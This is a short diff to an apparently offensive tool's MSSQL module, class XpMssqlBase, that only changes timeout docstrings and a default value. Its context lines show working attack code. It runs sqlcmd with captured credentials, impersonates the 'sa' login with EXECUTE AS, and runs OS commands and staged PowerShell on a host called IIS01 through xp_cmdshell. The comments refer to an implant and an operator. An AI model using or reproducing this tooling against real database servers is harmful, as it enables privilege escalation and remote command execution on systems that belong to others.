@@ -43,7 +43,10 @@ class XpMssqlBase:
         return f'{exe} -S {self._host} -U {self._login} -P {self._password} -C -y 0'
 
     def _exec_q(self, shell, tsql: str, timeout_s: int = None) -> str:
-        """Send one sqlcmd -Q task. Escapes " for C runtime -Q "..." boundary only."""
+        """Send one sqlcmd -Q task. Escapes " for C runtime -Q "..." boundary only.
+
+        timeout_s (optional): implant wait-limit override (None = operator
+        `timeout <n>`); the poll blocks until the task terminates."""
         if getattr(shell, 'debug', False):
             print(f"[DBG] TSQL  : {tsql}")
         cmd = f'{self._sqlcmd_prefix()} -Q "{tsql.replace(chr(34), chr(34)*2)}"'
@@ -109,8 +112,11 @@ class XpMssqlBase:
         self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'del /f {self._tsql_escape(bat)} {self._tsql_escape(out_file)}'")
         print(output)
 
-    def cmd_xpshell_psh(self, shell, script: str, timeout_s: int = 120):
-        """Stage and run a PowerShell script on IIS01; stdout captured by xp_cmdshell."""
+    def cmd_xpshell_psh(self, shell, script: str, timeout_s: int = None):
+        """Stage and run a PowerShell script on IIS01; stdout captured by xp_cmdshell.
+
+        timeout_s (optional): implant wait-limit override (None = operator
+        `timeout <n>` value; the poll itself blocks until the task terminates)."""
         if getattr(shell, 'debug', False):
             preview = script[:400] + ('…' if len(script) > 400 else '')
             print(f"[DBG] PSH   : {preview}")
